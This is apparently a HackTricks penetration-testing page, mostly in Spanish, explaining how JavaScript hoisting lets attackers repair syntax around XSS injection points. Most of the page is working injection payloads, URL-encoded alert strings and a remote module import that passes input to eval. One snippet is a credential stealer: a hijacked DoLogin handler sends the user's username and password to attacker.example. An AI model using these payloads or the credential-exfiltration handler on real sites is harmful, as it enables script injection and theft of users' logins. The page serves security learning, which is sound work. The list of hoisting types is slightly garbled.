# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

En el lenguaje JavaScript existe un mecanismo conocido como **Hoisting** donde las declaraciones de variables, funciones, clases o imports se conceptualizan como elevadas al inicio de su scope antes de que el código se ejecute. Este proceso lo realiza automáticamente el motor de JavaScript, que recorre el script en múltiples pasadas.

Durante la primera pasada, el engine parsea el código para verificar errores de sintaxis y lo transforma en un árbol de sintaxis abstracta. Esta fase incluye hoisting, un proceso en el que ciertas declaraciones se mueven al inicio del contexto de ejecución. Si la fase de parseo tiene éxito, indicando que no hay errores de sintaxis, se procede a la ejecución del script.

Es crucial entender que:

1. El script debe estar libre de errores de sintaxis para que la ejecución ocurra. Se deben respetar estrictamente las reglas de sintaxis.
2. La ubicación del código dentro del script afecta la ejecución debido al hoisting, aunque el código ejecutado pueda diferir de su representación textual.

#### Types of Hoisting

Según la información de MDN, hay cuatro tipos distintos de hoisting en JavaScript:

1. **Value Hoisting**: Permite el uso del valor de una variable dentro de su scope antes de su línea de declaración.
2. **Declaration Hoisting**: Permite referenciar una variable dentro de su scope antes de su declaración sin causar un `ReferenceError`, pero el valor de la variable será `undefined`.
3. Este tipo altera el comportamiento dentro de su scope debido a que la declaración de la variable ocurre antes de su línea de declaración real.
4. Los efectos secundarios de la declaración ocurren antes de que se evalúe el resto del código que la contiene.

En detalle, las declaraciones de función exhiben el comportamiento de hoisting de tipo 1. La palabra clave `var` demuestra el comportamiento de tipo 2. Las declaraciones léxicas, que incluyen `let`, `const` y `class`, muestran el comportamiento de tipo 3. Por último, las sentencias `import` son únicas en que se hoistean con los comportamientos de tipo 1 y tipo 4.

## Scenarios

Por lo tanto, si tienes escenarios donde puedes **Inject JS code after an undeclared object** es usado, podrías **fix the syntax** declarándolo (para que tu código se ejecute en lugar de lanzar un error):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Más escenarios
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Anticipa declaraciones posteriores bloqueando un nombre con const

Si puedes ejecutar código antes de que se analice una declaración `function foo(){...}` a nivel superior, declarar una vinculación léxica con el mismo nombre (p. ej., `const foo = ...`) impedirá que la posterior declaración de función reasigne ese identificador. Esto puede aprovecharse en RXSS para secuestrar manejadores críticos definidos más adelante en la página:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Notas
- Esto se basa en el orden de ejecución y el ámbito global (nivel superior).
- Si tu payload se ejecuta dentro de `eval()`, recuerda que `const/let` dentro de `eval` tienen alcance de bloque y no crearán enlaces globales. Inyecta un nuevo elemento `<script>` con el código para establecer un verdadero `const` global.

## Referencias

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)

{{#include ../../banners/hacktricks-training.md}}
